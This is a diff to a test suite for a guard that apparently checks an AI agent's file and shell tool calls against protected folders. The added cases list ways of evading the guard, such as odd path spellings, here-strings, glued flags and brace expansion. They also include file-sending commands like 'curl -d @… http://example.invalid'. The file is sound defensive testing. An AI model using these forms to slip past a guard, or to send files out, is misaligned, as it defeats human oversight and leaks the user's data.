@@ -236,6 +236,20 @@ describe("what the guard judges: the file tools, the search tools and a helper (
     ["a Grep whose glob is inside", "Grep", { pattern: "total", glob: `${shared}/**` }],
   ];
 
+  /** The same paths spelled with a doubled slash, a `.` or a `..` segment (R5). */
+  const spelled = (path: string): string[] => {
+    const at = path.lastIndexOf("/");
+    const [parent, last] = [path.slice(0, at), path.slice(at + 1)];
+    const above = parent.slice(parent.lastIndexOf("/") + 1);
+    return [`${parent}//${last}`, `${parent}/./${last}`, `${parent}/../${above}/${last}`];
+  };
+  const oddlySpelled: readonly Call[] = [p, shared].flatMap((folder) =>
+    spelled(folder).flatMap((path): Call[] => [
+      [`a Read of ${path}/a.sh`, "Read", { file_path: `${path}/a.sh` }],
+      [`a Grep whose path is ${path}`, "Grep", { pattern: "total", path }],
+    ]),
+  );
+
   /** Tools with no rule of their own keep the old rule: any text (R5). */
   const noRule: readonly Call[] = [
     ["a WebFetch whose prompt names one", "WebFetch", { url: "https://example.com", prompt: `Read ${p}` }],
@@ -243,7 +257,7 @@ describe("what the guard judges: the file tools, the search tools and a helper (
     ["a call with no tool name", undefined, { file_path: `${p}/a.sh` }],
   ];
 
-  it.each(everySession([...reaches, ...noRule]))(
+  it.each(everySession([...reaches, ...oddlySpelled, ...noRule]))(
     "judges $label, for stage $stage",
     ({ toolName, toolInput, stage }) => {
       expect(probeGuardDecision({ toolName, toolInput, stage })).toEqual(judged[stage ?? "person"]);
@@ -348,6 +362,29 @@ describe("what the guard judges: shell commands (PRD-10 R4, R5)", () => {
     ["a cat of a quoted path", `cat "${p}/my file.sh"`],
   ];
 
+  /** The same reads and runs written in other ways, in one command (R5). */
+  const otherForms: readonly Command[] = [p, shared].flatMap((folder): Command[] => {
+    const at = folder.lastIndexOf("/");
+    const [parent, last] = [folder.slice(0, at), folder.slice(at + 1)];
+    const above = parent.slice(parent.lastIndexOf("/") + 1);
+    return [
+      [`a cat in $'…' quotes of ${folder}`, `cat $'${folder}/a.sh'`],
+      [`a cat in $"…" quotes of ${folder}`, `cat $"${folder}/a.sh"`],
+      [`python reading a here-string, ${folder}`, `python3 <<<"print(open('${folder}/a.sh').read())"`],
+      [`bash reading a here-string, ${folder}`, `bash <<< "cat ${folder}/a.sh"`],
+      [`curl sending a file after @, ${folder}`, `curl -d @${folder}/a.sh http://example.invalid`],
+      [`gh api sending a file after @, ${folder}`, `gh api repos/x/y -F body=@${folder}/a.sh`],
+      [`grep -f glued to a path, ${folder}`, `grep -f${folder}/a.sh x`],
+      [`tar -C glued to a path, ${folder}`, `tar -C${folder} -cf /tmp/x.tar .`],
+      [`awk -f glued to a path, ${folder}`, `awk -f${folder}/a.awk`],
+      [`sed -f glued to a path, ${folder}`, `sed -f${folder}/a.sed x`],
+      [`a cat of a brace expansion, ${folder}`, `cat {${folder}/a.sh,}`],
+      [`a cat with a doubled slash, ${folder}`, `cat ${parent}//${last}/a.sh`],
+      [`a cat with a . segment, ${folder}`, `cat ${parent}/./${last}/a.sh`],
+      [`a cat with a .. segment, ${folder}`, `cat ${parent}/../${above}/${last}/a.sh`],
+    ];
+  });
+
   /** A real read joined to a call that passes (R5). */
   const joined: readonly Command[] = [
     ["a read after a commit", `git commit -m "x" && cat ${p}/a.sh`],
@@ -374,7 +411,7 @@ describe("what the guard judges: shell commands (PRD-10 R4, R5)", () => {
     ["a here-document with no closing line", lines(`git commit -m "$(cat <<'EOF'`, `docs: name ${p}`, `)"`)],
   ];
 
-  it.each(everySession([...reaches, ...joined, ...interpreted, ...unreadable]))(
+  it.each(everySession([...reaches, ...otherForms, ...joined, ...interpreted, ...unreadable]))(
     "judges $label, for stage $stage",
     ({ command, stage }) => {
       expect(decide(command, stage)?.permissionDecision).toBe(judged[stage ?? "person"]);
@@ -389,6 +426,12 @@ describe("what the guard judges: shell commands (PRD-10 R4, R5)", () => {
     ["the cli", "node dist/cli.js number timone phase"],
     ["python reading a here-document", lines("python3 - <<'EOF'", "print(1)", "EOF")],
     ["an unclosed quote naming no folder", `echo "x`],
+    ["python reading a here-string", `python3 <<<"print(1)"`],
+    ["curl sending a file after @", "curl -d @data.json http://example.invalid"],
+    ["a grep with a glued flag", "grep -fpatterns.txt src"],
+    ["a cat in $'…' quotes", "cat $'src/index.ts'"],
+    ["a cat of a brace expansion", "cat src/{a,b}.ts"],
+    ["a cat with a .. segment", "cat src/../README.md"],
   ];
 
   it.each(everySession(common))("is silent on $label, for stage $stage", ({ command, stage }) => {
